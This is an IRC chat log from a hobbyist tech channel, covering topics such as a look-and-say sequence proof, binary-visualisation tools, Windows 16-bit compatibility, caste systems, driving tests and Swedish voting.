Jun 28 13:55:09 <nortti>	you have several lines of context, how do you add that with a bot?
Jun 28 13:55:15 <shikhin>	Just paste them all?
Jun 28 13:55:29 <shikhin>	There's only the distinct possibility that you'll overflow the line limit because of timestamps and nicks, but that's rare enough.
Jun 28 13:55:37 <nortti>	and then give it a "commit this"?
Jun 28 13:55:43 <shikhin>	Sure.
Jun 28 13:55:58 <nortti>	how do you distinguish the command from the lines themselves?
Jun 28 13:56:08 <shikhin>	Might not be for everyone, but e.g. it solves the "I'm on my phone" problem.
Jun 28 13:56:14 <nortti>	mh
Jun 28 13:56:32 <shikhin>	[tags], timestamps, "Done."
Jun 28 13:56:46 <nortti>	the reason I asked if sth like ed, because basic ed-iting is easy to implement, and it would allow you to fix your fuckups
Jun 28 13:56:47 <shikhin>	(Or "Cancel" or other auxiliary stuff.)
Jun 28 13:57:01 <shikhin>	Hehe, "basic ed-iting".
Jun 28 13:57:14 <nortti>	and the modality allows an easy way of distinguishing between commands and contents
Jun 28 13:57:28 <shikhin>	Probably not a bad idea.
Jun 28 13:57:43 <shikhin>	But er.
Jun 28 13:58:18 <olsner>	ed over irc sounds great, almost makes me want to learn how to use ed
Jun 28 13:58:19 <shikhin>	Then the next step would be to just tell it which lines to take from the backlog.
Jun 28 13:58:31 <shikhin>	Don't need to worry about copying from the public logs, etc.
Jun 28 13:58:55 <nortti>	olsner: we used to have ##ircplaysed at one point
Jun 28 13:59:21 <shikhin>	Spoiler: we won.
Jun 28 13:59:49 <nortti>	shikhin: hm, fair point. sadly, there isn't any real good way of identifying a line in the logs in a way that wouldn't change as new messages are sent
Jun 28 14:00:45 <shikhin>	Right, and you'd still need to check with the public logs to make sure you both got the messages in the same order.
Jun 28 14:02:24 <nortti>	mh
Jun 28 14:05:34 <nortti>	of course, you could have another irc channel that gets the tail -f of the authoritative log

Jun 28 22:05:30 <nanovad>	Just some chinsy ass-unit too
Jun 28 22:05:46 <nanovad>	But it lasted a year and a half before double-clicks started happening
Jun 28 22:06:01 <shikhin>	Ooh, yes, that's an issue with my old one too.
Jun 28 22:06:11 <shikhin>	(I last used that half a decade ago, though. It's rotting somewhere in India.)
Jun 28 22:06:23 <shikhin>	Maybe I ought to buy a fancy one for gaming?
Jun 28 22:06:31 *	nanovad shrugs
Jun 28 22:06:37 <nanovad>	I have no complaints about my G602, it's only $40.
Jun 28 22:06:59 <nanovad>	Supposedly has a 250km (yes, km) travel distance on the mouse pad before the pads are worn out.
Jun 28 22:07:08 <nanovad>	And some slightly absurd amount of clicks.
Jun 28 22:07:12 <nanovad>	But it's heavier than your average workstation mouse.
Jun 28 22:07:22 <shikhin>	=wa distance between boston and hanover, nh
Jun 28 22:07:26 <Eldis4>	​shikhin: 184.1 km (kilometers)
Jun 28 22:07:36 <shikhin>	I could go to Boston with it and it'd still work.
Jun 28 22:07:52 <nanovad>	And even if you wore out the pads, you could still slide along on the plastic.
Jun 28 22:08:12 <shikhin>	The list price is $80, neat $45 discount.
Jun 28 22:08:20 *	shikhin adds to cart for next week.
Jun 28 22:08:40 <shikhin>	"Add an accessory: AmazonBasics Gaming Mouse Pad $6.99"
Jun 28 22:08:49 <shikhin>	Yes, thanks, Amazon. As an accessory to my mouse, I want your mouse.
Jun 28 22:08:57 <nanovad>	pad
Jun 28 22:08:59 <shikhin>	Oh, pad.
Jun 28 22:09:01 *	shikhin is blind.
Jun 28 22:09:39 <nanovad>	:P
Jun 28 22:10:03 <nanovad>	My peripherals and configuration is an odd mix of "We had this leftover from a workstation" and "I bought this on purpose".
Jun 28 22:10:56 <nanovad>	Like, I have a gaming mouse on a workstation mousepad, a gaming graphics card but late-2000s LCDs, and random assorted things for other computers
Jun 28 22:11:42 <shikhin>	Hehe.
Jun 28 22:12:06 <nanovad>	Though I will say that I'm glad my primary monitor goes to 75Hz.
Jun 28 22:12:16 <nanovad>	It's not a big difference from 60Hz monitors but it's noticeable.
Jun 28 22:12:50 *	shikhin wouldn't mind purchasing a desktop, but, uh, grad school.
Jun 28 22:13:03 *	nanovad nods
Jun 28 22:13:16 *	nanovad . o O ( mini-ITX in a backpack )
Jun 28 22:13:43 <shikhin>	(Right now I'm discovering that it costs about $100 to $150 for one application... the only frame of reference I have is a friend applying for thirteen schools, so, uh, damn.)
Jun 28 22:14:01 <nanovad>	Yikes.
Jun 28 22:14:15 <nanovad>	So at the end of that, will you have a PhD in mathematics?
Jun 28 22:14:23 <shikhin>	:D:
Jun 28 22:15:03 <olsner>	oh, are you getting a PhD?
Jun 28 22:15:10 <shikhin>	(N-not sure if yours was a genuine question or commenting on the complicated state of applying to schools, but I'm going to presume latter.)
Jun 28 22:15:18 <nanovad>	Kinda both.
Jun 28 22:15:52 <shikhin>	I have no idea how this works, but I think some schools let you (or force you to) directly do a PhD, some only accept you for a graduate degree.
Jun 28 22:15:57 <shikhin>	I'm going to apply for both?
Jun 28 22:16:24 <nanovad>	Isn't a PhD a graduate degree?
Jun 28 22:16:37 <nanovad>	Or do you mean a masters?
Jun 28 22:16:43 <shikhin>	Yeah, masters.
Jun 28 22:16:54 <nanovad>	gotcha
Jun 28 22:17:44 <shikhin>	Obviously would prefer directly starting with the PhD, but I think those schools pretty much still want you do the things you do in a masters program (take the same amount of courses, same level of qualification exams, etc).
Jun 28 22:32:09 <olsner>	you were applying to something french, weren't you? are you going to europe now, or is that just a possible option?
Jun 28 22:35:28 <shikhin>	Just a possible option; definitely applying everywhere (...now that I think of it, probably going to apply in almost every continent? maybe not South America), will decide after that.
Jun 28 22:36:06 <shikhin>	But a lot more US schools on my list so far than other schools. :<
Jun 28 22:36:33 <olsner>	are you on a scholarship btw, or do you actually pay the school(s) yourself?
Jun 28 22:37:41 <shikhin>	Er, probably going to get some scholarship or the other, haven't looked too much into that but it's not really my first worry when applying for things.
Jun 28 22:38:22 <shikhin>	(There's a scholarship in Dartmouth's math department for paying for grad school, I'm hopeful about that.)
Jun 28 22:38:32 <shikhin>	(Er, for any grad school, not just Dartmouth..)
Jun 28 22:40:05 <shikhin>	My first worry is the standardized tests (in this case, just the GRE, pretty annoying) and all the procedural stuff. :(
Jun 28 22:55:31 <olsner>	time to go finish up the second-to-last week at work
Jun 28 22:56:22 <shikhin>	Whee?

Jun 30 01:45:55 <nortti>	in the look-and-say sequence, you have digits in the pattern r₁₁r₁₂…r₁ₙd₁r₂₁r₂₂…r₂ₙd₂…rₘ₁rₘ₂…rₘₙdₘ, where rₖ are the digits marking how long the digit repeated and dₖ is the digit. you can think of there being a function, L(x), which evaluates to the next item in the sequence from x
Jun 30 01:48:42 <nortti>	by N-run, I mean in the digit sequence there is N of the same digit next to each other. if you limit yourself to inputs with at max 1-runs, with L you can generate a 2-run (L(1) = 11). if you limit yourself to at max 2-runs, you can generate a 3-run (L(12) = 1112). but you can't generate a 4-run if you limit yourself to 3-runs

Jun 30 01:53:29 <nortti>	for the proof, we first need the fact that dₖ can never be the same as dₖ₊₁. this is because it would describe a sequence of digits that has a run of one digit, followed by a separate run by the same digit. since there is nothing that could distinguish one run from the next, it would be considered one run of the digit, and so you'd only have one of the rₖ₁rₖ₂…rₖₙdₖ
Jun 30 01:56:10 <nortti>	then, since we are limiting ourselves to 3-runs in the input to the L-function, you can only have at maximum one r-digit. this is because 3 < 9. since we always have at least one r-digit, in this situation our output will look like r₁₁d₁r₂₁d₂…rₘ₁dₘ, r and d digits alternating
Jun 30 01:56:54 <nortti>	a run of 4 could either be aligned so that it starts at an r-digit or at a d-digit. so, either
Jun 30 01:57:11 <nortti>	rdrd OR rdrdr
Jun 30 01:57:20 <nortti>	NNNN    ?NNNN
Jun 30 01:58:08 <nortti>	in both situations, we violate the rule that dₖ can never be the same as dₖ₊₁. therefore, you cannot generate a run of 4 from a run of 3
Jun 30 01:58:24 <nortti>	^ is this correct? shikhin, FireFly?
Jun 30 02:04:33 <nortti>	actually, hm, I think that proof hold that you can't generate a 4-run from N-run N≤9

Jun 30 09:09:42 <zgrep>	Ease of use, compatibility. Not all information on my website is mission critical. If it's not mission critical, I might as well be flexible and offer HTTP.
Jun 30 09:09:49 <sortie>	The primary reason I do HTTP on sortix.org is because I'm not sure how future proof HTTPS is. I kinda want an old Sortix system coming alive after decades to still be able to make sense of sortix.org (I do my own signing)

Jun 30 10:24:02 <nanovad>	Oh, hydroplaning?
Jun 30 10:24:03 <olsner>	e.g. for driving (and stopping!) on snow (I guess it's applicable for aquaplaning too)
Jun 30 10:24:12 <john_cephalopoda>	What you see is possibly coming to work out that carl gets?
Jun 30 10:24:13 <nanovad>	Yeah, there's no tests for any of that

Jun 30 10:25:07 <FireFly>	The sliding test is apparently really fun
Jun 30 10:25:17 <john_cephalopoda>	The Lay might be ok, but the "teck" must be "tech", as in the German word "Blech".
Jun 30 10:25:27 <olsner>	it's not really a test here, it's just a mandatory exercise to go there, skid around a bit to see how it feels, and discuss some other safety stuff
Jun 30 10:25:38 <FireFly>	ah, well sure, that
Jun 30 10:29:54 <nanovad>	Here it's "whip around in a snowy parking lot to get a feel for it", but it's not an official thing you do
Jun 30 10:30:10 <nanovad>	They basically just tell you how to get out of skids and to increase stopping/following distance in adverse weather
Jun 30 10:30:14 <nanovad>	or a slippery road
Jun 30 10:31:46 <nanovad>	I think the actual license test consists of lane changes, turns, stop sign handling, parking, three-point turns, reverse turns, and maybe a few other common maneuvers
Jun 30 10:31:53 <nanovad>	I don't know if it even tests for merging on to a highway
Jun 30 10:32:22 <nanovad>	I just hope my test is dry, because there will likely be a lot of snow when I'm taking it
Jun 30 10:32:25 <olsner>	I don't really remember actually learning much about what to do in a skid, it was just trying out skidding
Jun 30 10:37:36 <nanovad>	hmm
Jun 30 10:37:42 <nanovad>	I think it does come naturally tbh
Jun 30 10:37:59 <nanovad>	In that you're just steering in the direction you want to go instead of where you're actually going
Jun 30 10:38:25 <olsner>	the driving test here is like a spotcheck, mostly it's up to the mood of the instructor where to go and what to do, but it has to include at least one test of maneuvering while reversing (e.g. turning around, reversing around a corner or parking), and iirc it must include city driving and highway driving
Jun 30 10:39:30 <olsner>	it might be highway or country road, since not all places actually have a highway
Jun 30 10:39:47 <john_cephalopoda>	I think the school and test are meant to basically be "You can now stay on a street in normal conditions and you didn't drive off a bridge or killed any humans. Now go and learn advanced techniques."
Jun 30 10:40:32 <olsner>	yeah, e.g. "You're safe enough to figure out the rest on your own."

Jun 30 13:46:10 <shikhin>	<+nortti> […] if you limit yourself to at max 2-runs, you can generate a 3-run (L(12) = 1112). […] <- 12 is a 1-run, though, right?
Jun 30 13:46:23 <shikhin>	(I mean, it's also a 2-run, just curious why you put it that way.)
Jun 30 13:47:43 <nortti>	it is
Jun 30 13:48:20 <nortti>	I originally was thinking (at around half past one at night last night) if you can go from N-run to (N+1)-run for any N
Jun 30 13:48:46 <nortti>	so, that's holdover from that
Jun 30 13:50:32 <shikhin>	<+nortti> then, since we are limiting ourselves to 3-runs in the input to the L-function, you can only have at maximum one r-digit. this is because 3 < 9. <- Uuh, why is this true? Maybe I'm confused about the N-run terminology, but a 9-run sequence could give you a 3-run sequence?
Jun 30 13:50:58 <nortti>	er, that should be a ≤
Jun 30 13:51:21 <shikhin>	No, I'm just saying that you could have something with a 9 in it and then you apply L to it and you get a 3-run sequence.
Jun 30 13:51:31 <shikhin>	Err.
Jun 30 13:52:10 <shikhin>	L(1…[10 times]…1) = 101?
Jun 30 13:52:22 <nortti>	yes
Jun 30 13:52:32 <shikhin>	Doesn't that go against what you said?
Jun 30 13:52:44 <nortti>	how?
Jun 30 13:53:08 <shikhin>	101 is a 1-run sequence and it has a two digit r?
Jun 30 13:53:57 <shikhin>	(Maybe you want to only look at sequences generated with the initial seed for the look-and-say sequence, but then you'd need to prove this doesn't happen then?)
Jun 30 13:54:37 <nortti>	oh, right. maybe I was a bit too inexact there. I mean that if your input has at most 9-runs, your output will have single-digit r
Jun 30 13:55:00 <shikhin>	Aha.
Jun 30 13:56:46 <shikhin>	…that's what you said, rather.
Jun 30 13:57:13 <shikhin>	Looks correct to me, mm. Did you compute what's the first time a 4-run happens?
Jun 30 13:57:32 <nortti>	how do you mean?
Jun 30 13:57:37 <shikhin>	With a computer.
Jun 30 13:57:53 <nortti>	er, I mean, what do you mean by "compute what's the first time a 4-run happens"?
Jun 30 13:58:29 <shikhin>	…oh wait.
Jun 30 13:58:57 <shikhin>	Nevermind, having lots of brainfarts here.
Jun 30 14:01:10 <shikhin>	"The look-and-say-sequence does not depend much on the chosen base, with one important restriction: Much of the regularity in the behavior relies on the fact that no other number than 1,2,3 can appear in the sequence. However, this is still true for any base ≥4." Huh.

Jul 01 03:47:49 <Vercas>	It's just AIDs.
Jul 01 03:48:11 <Vercas>	To achieve that redundancy, you gotta make sure your commands are sent.
Jul 01 03:48:24 <Vercas>	Software solutions deal poorly with power outages and such.
Jul 01 03:49:36 <Vercas>	Hardware solutions have caches (sometimes even non-volatile ones) and the ability to issue more than one command atomically.

Jul 01 07:12:00 <FireFly>	heh, neat
Jul 01 07:13:56 <FireFly>	It's a good example of how making good use of visuals can make humans very efficient at detecting patterns or discrepancies
Jul 01 07:15:49 <john_cephalopoda>	Humans are also pretty good to spot a difference in multiple similar-looking objects. E.g. spotting a sad smiley in a huge grid of happy smileys.
Jul 01 07:16:07 <FireFly>	I think that counts as a discrepancy :P
Jul 01 07:16:16 <FireFly>	something that sticks out
Jul 01 07:16:18 <FireFly>	but yeah
Jul 01 07:16:33 <john_cephalopoda>	This was applied in old aircraft where the engine parameters were gauges placed next to each other, so you could see easily if one of the engine was doing something weird.
Jul 01 07:17:34 <FireFly>	this was kind of the motivating idea behind pixd: to see if this kind of visual feedback/pattern recognition could come in handy for binary data/"hexdump"-style analysis
Jul 01 07:18:22 <john_cephalopoda>	Oh, that is an interesting idea.
Jul 01 07:18:56 <john_cephalopoda>	By exporting the images and flipping them back and forth, one could even make a blink comparator for it.
Jul 01 07:20:16 <FireFly>	the "blink comparator" idea reminds me of the modern-day "slide to show differences" widget/visualisation for comparing before/after
Jul 01 07:20:27 <FireFly>	also reminds me of Dolphin's fifoci
Jul 01 07:21:01 <john_cephalopoda>	Github has/had that difference slider for showing changes in images that were checked into git.
Jul 01 07:21:10 <FireFly>	Yeah
Jul 01 07:21:26 <john_cephalopoda>	Hmm, maybe I could use pixd on my server logs.
Jul 01 07:22:09 <FireFly>	the Dolphin thing has traces of GPU operations for a few frames of certain games, known to display certain tricky things/be bug-prone etc, and runs the same GPU op trace on two different branches, visually diffing the screenshots of each frame and highlighting differences/amplifying them
Jul 01 07:22:27 <FireFly>	so it's a neat idea I think for visually oriented projects like that
Jul 01 07:22:40 <FireFly>	as a kind of CI/testing tool
Jul 01 07:23:40 <FireFly>	john_cephalopoda: honestly, I don't use pixd like ever; I prefer to just use hexd (regular hexdump tool, but with colours for specific ranges) instead since it kinda gives me the same benefit (visual recognition of patterns) but also shows me a full hexdump as well
Jul 01 07:24:07 <FireFly>	some others seem to find pixd useful though, so ~shrug~
Jul 01 07:25:54 <john_cephalopoda>	Oh, ELF is pretty.
Jul 01 07:26:57 <john_cephalopoda>	My logs aren't interesting though. Charset probably too limited and text too unstructured in hex.

Jul 01 12:40:15 <zgrep>	Why are there more car crashes in the summer than in the winter? Why, it's elementary physics. During the summer, the average temperature is higher. Higher temperatures expand the metal of car bodies, which means that car volumes are largers. Larger car volumes mean that the probability of cars occupying the same space on a same-width road increases. This means that crashes are more likely. QED.

Jul 01 13:16:44 <S_Gautam>	https://www.bbc.com/news/world-asia-34615972 what
Jul 01 13:16:46 <bslsk05>	​www.bbc.com: Japan's hidden caste of untouchables - BBC News
Jul 01 13:17:05 <S_Gautam>	i guess it's not as bad as ours probably
Jul 01 13:20:03 <shikhin>	Doesn't seem to be literally untouchables, for one.
Jul 01 13:20:16 *	shikhin sighs.
Jul 01 13:22:24 <S_Gautam>	the caste system was abolished in 1871 in Japan, we abolished it in 1950, meaning we're current at year 1939 on the basis of casteism
Jul 01 13:22:33 <S_Gautam>	do you know what year is it as per the Hindu calendar?
Jul 01 13:22:37 <S_Gautam>	that's right, 1939
Jul 01 13:22:38 <shikhin>	"He also eschews the "supreme Godfather" image, in public at least: after his appointment as kumicho, he insisted on taking the train to his induction ceremony instead of a chauffeured limousine. He also reportedly stopped in a street ramen noodle restaurant on the way to the lavish yakuza banquet arranged in his honor."
Jul 01 13:23:52 <nortti>	S_Gautam: what do you mean by "meaning we're current at year 1939 on the basis of casteism"?

Jul 01 13:23:58 <bslsk05>	​en.wikipedia.org: Thief in law - Wikipedia
Jul 01 13:24:13 <nortti>	also, aren't there several different ways to count years for hindu calendars?
Jul 01 13:24:15 <S_Gautam>	nortti: 1950 - 1871 = 79, a social backlog of 79 years
Jul 01 13:24:21 <S_Gautam>	nortti: official is Saka calendar
Jul 01 13:24:25 <nortti>	ah
Jul 01 13:24:36 <S_Gautam>	https://en.wikipedia.org/wiki/Indian_national_calendar
Jul 01 13:24:36 <bslsk05>	​en.wikipedia.org: Indian national calendar - Wikipedia
Jul 01 13:25:23 <shikhin>	"After World War II, the vory in the Gulag system were weakened by the so-called Bitch Wars - a prison gang war between pure vory and the so-called suki ("bitches"). The 'suki' were former members of the criminal underworld who had broken the thieves' code by agreeing to join the Soviet army and fight against Nazi Germany during World War II (in exchange for being freed from prison)."
Jul 01 13:26:41 <nortti>	how's you end up reading about organized crime?
Jul 01 13:27:10 <shikhin>	https://www.bbc.com/news/world-asia-34615972 has a photo with the caption "Members of of Japan's largest organised crime syndicate, the Yamaguchi-gumi, said to count many Burakumin among its ranks."
Jul 01 13:27:44 <nortti>	fair enough. and then wikipediaed your way into vory?
Jul 01 13:27:59 *	shikhin nods.
Jul 01 13:28:10 <john_cephalopoda>	S_Gautam: You can't really compare things from how long they existed.
Jul 01 13:28:54 <S_Gautam>	sure, but in this case it makes sense
Jul 01 13:29:27 <shikhin>	Eh.
Jul 01 13:29:40 <nortti>	"At the start of the Edo period (1603–1867), the social class system (more properly, a caste system, since it was based upon birth and not upon economics) was officially established as a means of designating hierarchy, and eta were placed at the lowest level, outside of the four main divisions of society. Like the rest of the population, they were bound by sumptuary laws based on the inheritance of 
Jul 01 13:29:47 <nortti>	their social class."
Jul 01 13:29:47 <john_cephalopoda>	S_Gautam: If you follow that logic, muslims are in the year 1386 right now, concerning their believes. 
Jul 01 13:29:57 <john_cephalopoda>	As compared to Christianity.
Jul 01 13:29:57 <shikhin>	...
Jul 01 13:30:00 <S_Gautam>	well, uh,...
Jul 01 13:30:00 <shikhin>	What?
Jul 01 13:30:01 <CompanionCube>	shikhin: by the way
Jul 01 13:30:08 <CompanionCube>	i asked them if they got the metadata
Jul 01 13:30:09 <CompanionCube>	they said yes
Jul 01 13:30:10 <S_Gautam>	I mean
Jul 01 13:30:13 <shikhin>	CompanionCube: Whoo.
Jul 01 13:30:30 <nortti>	"When dealing with members of other castes, they were expected to display signs of subservience, such as the removal of headwear. Physical contact was considered absolutely taboo and required ritual purification for the non-eta person." looks like the burakumin used to literally be untouchables
Jul 01 13:30:32 <CompanionCube>	also i was 3 places away from getting a fancy coloured line on the graph
Jul 01 13:30:35 <CompanionCube>	but everything's done now
Jul 01 13:30:39 <shikhin>	nortti: Ah, huh.
Jul 01 13:31:21 <S_Gautam>	so basically by 2097 the caste system might be largely purged from Indian society? lulz
Jul 01 13:31:38 <john_cephalopoda>	S_Gautam: It feels like comparing things that way could be a slippery slope that leads to "We are further in the time plan, as compared to others, so our issues can exist a bit longer without it being an issue."
Jul 01 13:31:44 <shikhin>	Did you actually read the BBC article, it's definitely still a problem in Japan.
Jul 01 13:31:58 <S_Gautam>	Yeah, but is it as bad as ours?
Jul 01 13:32:01 <S_Gautam>	I doubt it.
Jul 01 13:32:48 *	shikhin blinks.
Jul 01 13:33:10 <shikhin>	You're the one who said it'll be "largely purged" by 2097 based on a pretty weird comparison, but okay...
Jul 01 13:33:25 *	kei86 (~kami@cpe-98-122-20-129.sc.res.rr.com) has joined
Jul 01 13:33:25 <S_Gautam>	Yeah, I realized the ridiculousness of the comparison
Jul 01 13:33:34 <S_Gautam>	that's why the "lulz"
Jul 01 13:33:58 <nortti>	S_Gautam: it feels like you have a very universalist view of development of societies
Jul 01 13:34:03 <shikhin>	"Nadamoto Masahisa of the Buraku History Institute estimates that between 60 and 80% of burakumin marry a non-burakumin, whereas for people born in the late 1930s and early 1940s, the rate was 10%."
Jul 01 13:34:21 <CompanionCube>	apparently something's fucked with my mastodon instance
Jul 01 13:34:49 <nortti>	shikhin: er, as in, that the way societies change conforms to pretty strict laws that universally hold
Jul 01 13:35:04 <nortti>	*S_Gautam
Jul 01 13:35:04 <shikhin>	No, that doesn't sound like me.
Jul 01 13:35:13 <shikhin>	"n 2001, future Prime Minister of Japan Tarō Asō, along with Hiromu Nonaka, was among the LDP's chief candidates to succeed Yoshirō Mori as prime minister of Japan. During a meeting of LDP leaders at which Nonaka was not present, Asō reportedly told the assembled group, "We are not going to let someone from the buraku become the prime minister, are we?"." ...
Jul 01 13:36:52 <CompanionCube>	aaa what's up with the database

Jul 01 13:38:50 <CompanionCube>	and the only other admin's offline 
Jul 01 13:39:00 <S_Gautam>	nortti: I think there are certain things that hold universally. It's pretty ironic coming from me since I was defending sedition laws a few days ago, but, personal freedom, secularism,  non-discriminating, democratic societies, are ultimately better than others. I don't think anyone would disagree? 
Jul 01 13:39:29 <S_Gautam>	Caste system is clearly opposed to many of those things.
Jul 01 13:39:55 <shikhin>	"the way societies change" change being the key word, not the way societies should be.
Jul 01 13:40:00 <nortti>	right

Jul 01 14:31:32 <olsner>	hm, kind of regular... was about to guess palettes, but it seems to be vaguely 4-byte periodic

Jul 01 14:32:03 <john_cephalopoda>	No xonotic today.
Jul 01 14:32:11 <FireFly>	so the thing immediately after it is probably also a sprite
Jul 01 14:32:40 <FireFly>	there's some other bitmaps that look pretty ... weird in the pixd false-colour representation

Jul 01 14:34:05 <olsner>	some way to resize the line length to match the stride of the bitmap might be nice

Jul 01 14:34:34 <FireFly>	(it's just a command-line utility piped through less -R)
Jul 01 14:35:16 <FireFly>	I'll have to take a closer look at this stuff some other day

Jul 01 14:45:12 <puckipedia>	FireFly: sprite, this looks like a bad pallette
Jul 01 14:45:44 <FireFly>	puckipedia: I mean yes, it's just pixd, i.e it's just mapping byte value to colour

Jul 01 14:50:01 <olsner>	or the sprites are too large to fit so they're actually two separate sprites
Jul 01 14:50:09 <olsner>	and then there's no reason for them to be contiguous

Jul 03 06:37:45 <S_Gautam>	so it seems that a Windows XP 32-bit machine serves as a Turkey-like bridge between the 16-bit DOS/Windows 3.1 era and the modern era, not to a complete extent but definitely
Jul 03 06:38:08 <S_Gautam>	I'm playing SkiFree at 1920 x 1080p natively without DOSBox, or even NTVDM
Jul 03 06:46:19 <S_Gautam>	heh this global time Windows 3.11 program still shows E/W Germany
Jul 03 06:49:56 <nortti>	oh, huh, I thought nt has always required ntvdm for 16bit sw
Jul 03 06:53:12 <S_Gautam>	wasn't Windows 3.x "protected 16-bit mode"?
Jul 03 06:53:34 <nortti>	if you ran the 286 kernel, yeah
Jul 03 06:53:39 <S_Gautam>	the integration is amazing though, I can copy commands from the Mathematica website into Mathematica 2.2
Jul 03 06:54:10 <nortti>	the 386 kernel used 32 bit protected mode and virtual x86 mode iirc
Jul 03 06:54:10 <S_Gautam>	even if it's under NTVDM
Jul 03 06:54:58 <nortti>	well, ntvdm is more high level thing. it doesn't run a win 3.11 there, but rather proxies the syscalls

Jul 03 08:14:16 <nortti>	ah
Jul 03 08:14:19 <asecretcat-web>	(note, it's different from what's known as WoW64)
Jul 03 08:14:33 <S_Gautam>	yeah that's the 32-bit compat layer
Jul 03 08:14:36 <nortti>	does wow64 works similarily in the very least?
Jul 03 08:14:38 <S_Gautam>	something i took for granted
Jul 03 08:14:52 <S_Gautam>	does linux have a 32-bit compat layer?
Jul 03 08:15:00 <asecretcat-web>	they're different, it's just that microsoft reused the naming
Jul 03 08:15:05 <nortti>	ah
Jul 03 08:15:12 <asecretcat-web>	yeah i think so, called x32?
Jul 03 08:16:47 <nortti>	looks like x32 is a third ABI, amd64 but with 32b pointers
Jul 03 08:17:10 <asecretcat-web>	seems like it yeah
Jul 03 08:18:00 <nortti>	but yeah, on amd64 (at least by default) kernel can run 32bit x86 binaries, and distroes have their own ways of providing 32bit libs and such
Jul 03 08:20:45 <S_Gautam>	why did the age of sharewares and demos end
Jul 03 08:21:06 <S_Gautam>	the last big game with a demo was Doom 2016, and it was badass, made me buy the game for the first time
Jul 03 08:21:22 <nortti>	how do you define a big game?
Jul 03 08:21:48 <S_Gautam>	something that's made by a relatively large company
Jul 03 08:21:52 <nortti>	also, from what I hear, on platforms like risc os and modern amiga shareware sw is still at least somewhat going
Jul 03 08:21:57 <S_Gautam>	bethesda, id, EA, Ubisoft
Jul 03 08:22:01 <nortti>	right
Jul 03 08:24:58 <asecretcat-web>	the culture around games shifted over the years
Jul 03 08:25:15 <asecretcat-web>	though some companies do offer some kind of demo or trial period depending on what game you think of
Jul 03 08:29:54 <nortti>	I guess there are also two big failure modes of a demo: a) it's bad and people avoid buying the game due to that   b) it's too good and people avoid buying your game, being satisfied with a demo
Jul 03 08:30:25 <nortti>	plus it takes extra effort to develop, and nowadays there are other ways to market than shareware demos

Jul 03 13:05:24 <S_Gautam>	research in what?
Jul 03 13:05:24 <shikhin>	Yeah.
Jul 03 13:05:27 <shikhin>	Math.
Jul 03 13:05:33 <FireFly>	If you've found a thing, and then lost it, so you need to re-search for it

Jul 03 13:07:56 <shikhin>	Haha.
Jul 03 13:08:12 <FireFly>	PR is nicer, but I feel FPTP does have one advantage over PR: local representation
Jul 03 13:08:13 <S_Gautam>	looks like one of those mysterious statues on some Pacific island
Jul 03 13:08:19 <sortie>	CompanionCube: I'm actually not entirely sure about our voting system (I want to look into that one day)
Jul 03 13:08:31 <CompanionCube>	FireFly: aren't there forms of PR with a local element?
Jul 03 13:08:44 <sortie>	CompanionCube: It's not FPTP though. I was told it's complicated.
Jul 03 13:08:46 <FireFly>	And from what I understand, in Sweden the north/rural parts get screwed over pretty much
Jul 03 13:08:58 <shikhin>	How so?
Jul 03 13:09:11 <FireFly>	sortie: huh, I kinda assumed it was just proportional representation
Jul 03 13:09:32 <sortie>	CompanionCube: It's more or less proportional for parties. If a party gets X% of the vote, they get approximately X% of the seats-
Jul 03 13:09:37 <olsner>	it seems only 8 people were killed in mass shootings in the US the past week
Jul 03 13:09:37 <shikhin>	"The Swedish Riksdag is made up of 349 MPs, and all are elected through proportional representation on multi-member party lists that are either regional (most major parties) or national (Sweden Democrats). Each of the 29 constituencies has a set number of parliamentarians that is divided through constituency results to ensure regional representation."
Jul 03 13:09:42 <shikhin>	That sounds like a decent compromise to me?
Jul 03 13:09:47 <FireFly>	hm
Jul 03 13:09:51 <FireFly>	interesting
Jul 03 13:10:26 *	shikhin posits that the only disadvantage to proportional representation is no one understands how exactly it works.
Jul 03 13:10:35 <FireFly>	haha
Jul 03 13:10:51 <sortie>	FireFly: It is, but we do have local districts where we elect people. Overflow votes are given to other members of the party, or shared between collation parties I think. And I think there's some national normalization or something to ensure it's overall proportional for parties.
Jul 03 13:11:05 <FireFly>	I think the preferential voting system is interesting though
Jul 03 13:11:09 <FireFly>	IIRC Australia does that
Jul 03 13:11:13 <FireFly>	(or maybe it was NZ)
Jul 03 13:11:17 <sortie>	It's also possible to vote for specific candidates
Jul 03 13:11:22 <shikhin>	Seems like Australia.
Jul 03 13:11:26 <shikhin>	sortie: Oh?
Jul 03 13:11:40 <shikhin>	In the same election? That sounds pretty complicated.
Jul 03 13:11:57 <FireFly>	In Sweden, you vote on three administrative levels (at the same time/same date), and you vote for either a party, or a specific candidate in a party
Jul 03 13:12:04 <FireFly>	(in each of the three elections)
Jul 03 13:12:14 <shikhin>	How does that roughly work?
Jul 03 13:12:30 <FireFly>	(municipal, county, nationwide)
Jul 03 13:14:33 <olsner>	oh right, it's an election year this year ... it's pretty nice to already know what party to vote for, then you can ignore all the stupid campaign stuff :)
Jul 03 13:14:40 <shikhin>	"Finally, if a party hasn't registered its candidates with the election authority, it is possible for a voter to manually write the name of an arbitrary candidate. In reality, this option is almost exclusively available when voting for unestablished parties. However, it has occasionally caused individuals to be elected into the city council to represent parties they don't even support as a result of a 
Jul 03 13:14:46 <shikhin>	single voter's vote."
Jul 03 13:15:07 <FireFly>	shikhin: so, there are ballots printed for each party, both blank ones and ones with named candidates with checkboxes. you put a ballot inside an envelope (possibly checking box), and then you seal the envelope and hand it off
Jul 03 13:15:12 <shikhin>	"Which candidates from which lists are to secure the seats allocated to the party is determined by two factors: preference votes are first used to choose candidates which pass a certain threshold,[10] then the number of votes cast for the various lists within that party are used." Ah.
Jul 03 13:15:34 <FireFly>	olsner: hm, I should decide that :P
Jul 03 13:15:59 <shikhin>	olsner: Who would you be voting for? :P
Jul 03 13:16:16 <CompanionCube>	iirc a parliamentary government doesn't strictly need an absolute majority, given that minority governments are A Thing
Jul 03 13:16:35 <shikhin>	Yep.
Jul 03 13:16:50 <shikhin>	Happen in India every now and then.
Jul 03 13:16:55 <CompanionCube>	and in the UK
Jul 03 13:17:25 <olsner>	shikhin: the left party
Jul 03 13:17:27 <CompanionCube>	(theresa may has no majority, they're being propped up by the DUP)
Jul 03 13:17:47 <olsner>	FireFly: "when in doubt, choose left"
Jul 03 13:17:54 *	FireFly nods
Jul 03 13:18:00 <FireFly>	I did vote V last election, might this time too
Jul 03 13:18:00 <shikhin>	"attempted to get Sweden to join the Non-Aligned Movement in 1980, but it did not succeed." Aw.
Jul 03 13:18:04 <shikhin>	V?
Jul 03 13:18:08 <FireFly>	left party
Jul 03 13:18:10 <shikhin>	Oh, their logo.
Jul 03 13:18:16 <shikhin>	Also name abbreviation apparently.
